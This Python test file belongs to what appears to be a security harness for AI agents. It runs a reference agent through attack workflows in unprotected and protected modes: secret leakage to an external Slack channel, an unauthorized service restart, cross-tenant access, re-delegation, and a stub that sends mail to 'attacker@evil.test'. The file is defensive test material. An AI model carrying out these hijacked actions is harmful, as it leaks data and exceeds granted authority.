import asyncio

from vais.reference_agent import (
    DeterministicReferenceTarget,
    ReferenceAgentRunner,
    ReferenceMode,
    attack_workflows,
    clean_workflows,
    control_workflows,
    reference_workflows,
    summarize_reference_results,
)


def test_reference_agent_has_five_clean_twenty_controls_and_twenty_attacks():
    assert len(clean_workflows()) == 5
    assert len(control_workflows()) == 20
    assert len(attack_workflows()) == 20
    attacks = {item.id: item for item in attack_workflows()}
    for control in control_workflows():
        attack = attacks[control.control_for]
        assert control.contract == attack.contract
        assert control.attack_surface == attack.attack_surface
        assert control.max_turns == attack.max_turns
        assert control.attack_text is None


def test_reference_agent_vulnerable_target_is_contained_and_preserves_clean_utility():
    runner = ReferenceAgentRunner()
    target = DeterministicReferenceTarget()
    results = asyncio.run(
        runner.run_matrix(reference_workflows(), (target,))
    )
    assert len(results) == 85  # 5 clean + 20 controls x 2 + 20 attacks x 2

    attacked = [item for item in results if item.attacked]
    controls = [item for item in results if item.control_for is not None]
    unprotected = [item for item in attacked if item.mode == ReferenceMode.UNPROTECTED]
    protected = [item for item in attacked if item.mode == ReferenceMode.PROTECTED]
    clean = [item for item in results if not item.attacked]

    assert len(unprotected) == 20
    assert len(protected) == 20
    assert len(controls) == 40
    assert all(item.security_violation for item in unprotected)
    assert all(not item.security_violation for item in protected)
    assert all(item.workflow_utility_success for item in protected)
    assert all(item.workflow_utility_success for item in clean)


def test_reference_agent_summary_reports_system_security_outcome():
    results = asyncio.run(
        ReferenceAgentRunner().run_matrix(
            reference_workflows(),
            (DeterministicReferenceTarget(),),
        )
    )
    summary = summarize_reference_results(results)
    metrics = summary["by_target"]["deterministic-reference-vulnerable"]
    assert metrics["attack_stories"] == 20
    assert metrics["matched_control_workflows"] == 20
    assert metrics["clean_workflows"] == 5
    assert metrics["by_mode"]["unprotected"]["baseline_overreach_workflows"] == 0
    assert metrics["by_mode"]["unprotected"]["attack_attributable_escalation_workflows"] == 20
    assert metrics["clean_workflow_utility_rate"] == 1.0
    assert metrics["protected_attacked_workflow_utility_rate"] == 1.0
    assert metrics["by_mode"]["unprotected"]["violation_rate"] == 1.0
    assert metrics["by_mode"]["protected"]["violation_rate"] == 0.0


def test_secret_chain_diverges_after_protected_denial():
    story = next(item for item in attack_workflows() if item.id == "attack-09")
    runner = ReferenceAgentRunner()
    target = DeterministicReferenceTarget()
    unprotected = asyncio.run(runner.run_workflow(story, target, mode=ReferenceMode.UNPROTECTED))
    protected = asyncio.run(runner.run_workflow(story, target, mode=ReferenceMode.PROTECTED))

    assert unprotected.security_violation
    assert not protected.security_violation
    # Secret access itself is authorized in this story. The security property is
    # that SECRET data cannot flow into an otherwise authorized PUBLIC sink.
    assert any(step.effect and step.effect.kind == "secret_read" for step in unprotected.trace)
    assert any(step.effect and step.effect.kind == "secret_read" for step in protected.trace)
    assert any(step.effect and step.effect.kind == "slack_external_sent" for step in unprotected.trace)
    assert not any(step.effect and step.effect.kind == "slack_external_sent" for step in protected.trace)


def test_reference_agent_records_attack_objective_and_escalation_separately():
    story = next(item for item in attack_workflows() if item.id == "attack-09")
    result = asyncio.run(
        ReferenceAgentRunner().run_workflow(
            story, DeterministicReferenceTarget(), mode=ReferenceMode.PROTECTED
        )
    )
    assert result.security_escalation_observed
    assert result.attack_objective_success
    assert not result.security_violation


def test_action_receipt_is_visible_after_denied_protected_action():
    story = next(item for item in attack_workflows() if item.id == "attack-03")
    result = asyncio.run(
        ReferenceAgentRunner().run_workflow(
            story, DeterministicReferenceTarget(), mode=ReferenceMode.PROTECTED
        )
    )
    denied = next(
        step for step in result.trace
        if step.action is not None and step.action.tool == "production.restart_service"
    )
    assert denied.receipt is not None
    assert denied.receipt.provenance.source == "vais:action_receipt"
    assert denied.receipt.data["executed"] is False
    assert denied.receipt.data["decision"] == "deny" or denied.receipt.data["decision"] == "require_approval"


def test_public_status_uses_trusted_declassifier_before_external_email():
    workflow = next(item for item in clean_workflows() if item.id == "clean-05")
    result = asyncio.run(
        ReferenceAgentRunner().run_workflow(
            workflow, DeterministicReferenceTarget(), mode=ReferenceMode.PROTECTED
        )
    )
    assert result.workflow_utility_success
    built = next(step for step in result.trace if step.effect and step.effect.kind == "public_update_built")
    assert built.result is not None
    assert built.result.is_trusted
    assert built.result.confidentiality.value == "public"
    email = next(step for step in result.trace if step.effect and step.effect.kind == "email_public_update_sent")
    assert email.action is not None
    assert "body" not in email.action.arguments
    assert email.action.plain_arguments()["artifact_id"] == built.result.data
    assert email.effect.provenance["body"].confidentiality.value == "public"


def test_reference_tasks_separate_exposed_tools_from_task_authority():
    story = next(item for item in attack_workflows() if item.id == "attack-03")
    assert "production.restart_service" in story.exposed_tools
    assert "production.restart_service" not in story.contract.allowed_tools
    assert "No production restart is authorized" in story.trusted_task


def test_cross_tenant_registry_does_not_depend_on_tenant_prefix():
    story = next(item for item in attack_workflows() if item.id == "attack-04")
    result = asyncio.run(
        ReferenceAgentRunner().run_workflow(
            story, DeterministicReferenceTarget(), mode=ReferenceMode.UNPROTECTED
        )
    )
    assert result.attack_objective_success
    tenant = next(item for item in result.invariants if item.invariant_id == "tenant_isolation")
    assert not tenant.passed
    assert "INC-9000" in tenant.detail
    assert "owner=tenant-b" in tenant.detail


def test_semantic_pair_delta_reports_attack_added_events():
    results = asyncio.run(
        ReferenceAgentRunner().run_matrix(
            reference_workflows(),
            (DeterministicReferenceTarget(),),
        )
    )
    metrics = summarize_reference_results(results)["by_target"]["deterministic-reference-vulnerable"]
    unprotected = metrics["by_mode"]["unprotected"]
    assert unprotected["baseline_overreach_workflows"] == 0
    assert unprotected["attack_added_security_event_workflows"] == 20
    assert unprotected["attack_added_violation_class_workflows"] == 20
    assert unprotected["attack_added_invariant_evidence_workflows"] == 20
    assert unprotected["pair_security_deltas"]["attack-15"]["added_violation_classes"]


def test_valid_target_utility_is_reported_separately():
    results = asyncio.run(
        ReferenceAgentRunner().run_matrix(
            reference_workflows(),
            (DeterministicReferenceTarget(),),
        )
    )
    metrics = summarize_reference_results(results)["by_target"]["deterministic-reference-vulnerable"]
    assert metrics["clean_workflow_utility_rate"] == 1.0
    assert metrics["clean_valid_workflow_utility_rate"] == 1.0
    assert metrics["protected_control_valid_workflow_utility_rate"] == 1.0
    assert metrics["protected_attacked_valid_workflow_utility_rate"] == 1.0


def test_delegation_stories_use_application_setup_without_granting_redelegation():
    stories = {item.id: item for item in attack_workflows()}
    for workflow_id in ("attack-18", "attack-19", "attack-20"):
        story = stories[workflow_id]
        assert "agent.delegate" in story.exposed_tools
        assert "agent.delegate" not in story.contract.allowed_tools
        assert "agents:delegate" not in story.contract.granted_scopes
        assert "already delegated" in story.trusted_task
        assert "knowledge:read" in story.trusted_task
        result = asyncio.run(
            ReferenceAgentRunner().run_workflow(
                story, DeterministicReferenceTarget(), mode=ReferenceMode.PROTECTED
            )
        )
        setup = next(
            step for step in result.trace
            if step.phase == "trusted_retrieval" and step.action is not None and step.action.tool == "agent.delegate"
        )
        assert setup.effect is not None
        assert setup.effect.kind == "agent_delegated"
        assert setup.decision is not None and setup.decision.type.value == "allow"
        assert result.workflow_utility_success


def test_public_dispatch_equivalent_sink_counts_for_recipient_hijack_objective():
    from vais.models import PlannedAction, TrustedValue
    from vais.targeting import GenerationMetadata, TargetRunResult, TargetStatus

    class PublicSinkHijackTarget:
        target_id = "public-sink-hijack"

        def metadata(self):
            return {"adapter": "test"}

        def propose(self, state, *, turn):
            return TargetRunResult(
                (
                    PlannedAction(
                        "email.send_public_update",
                        {"recipient": TrustedValue("attacker@evil.test", source="model"), "artifact_id": TrustedValue("pub-INC-1234-001", source="model")},
                    ),
                ),
                GenerationMetadata(status=TargetStatus.VALID_PLAN, provider="test", model=self.target_id),
            )

    story = next(item for item in attack_workflows() if item.id == "attack-01")
    result = asyncio.run(
        ReferenceAgentRunner().run_workflow(
            story, PublicSinkHijackTarget(), mode=ReferenceMode.UNPROTECTED
        )
    )
    assert result.attack_objective_success


def test_model_cannot_redelegate_after_application_delegation_setup():
    from vais.models import PlannedAction, TrustedValue
    from vais.targeting import GenerationMetadata, TargetRunResult, TargetStatus

    class RedelegatingTarget:
        target_id = "redelegating-target"

        def metadata(self):
            return {"adapter": "test"}

        def propose(self, state, *, turn):
            return TargetRunResult(
                (
                    PlannedAction(
                        "agent.delegate",
                        {
                            "agent_id": state.workflow.contract.bound_arguments[("agent.delegate", "agent_id")],
                            "scope": state.workflow.contract.bound_arguments[("agent.delegate", "scope")],
                            "task": TrustedValue("research INC-1234 again", source="model"),
                        },
                    ),
                ),
                GenerationMetadata(status=TargetStatus.VALID_PLAN, provider="test", model=self.target_id),
            )

    story = next(item for item in attack_workflows() if item.id == "attack-18")
    result = asyncio.run(
        ReferenceAgentRunner().run_workflow(
            story, RedelegatingTarget(), mode=ReferenceMode.PROTECTED
        )
    )
    model_delegate = next(
        step for step in result.trace
        if step.phase.startswith("agent_turn_") and step.action is not None and step.action.tool == "agent.delegate"
    )
    assert model_delegate.decision is not None
    assert model_delegate.decision.type.value == "deny"
    assert model_delegate.effect is None
    assert model_delegate.call_state.value == "not_called"
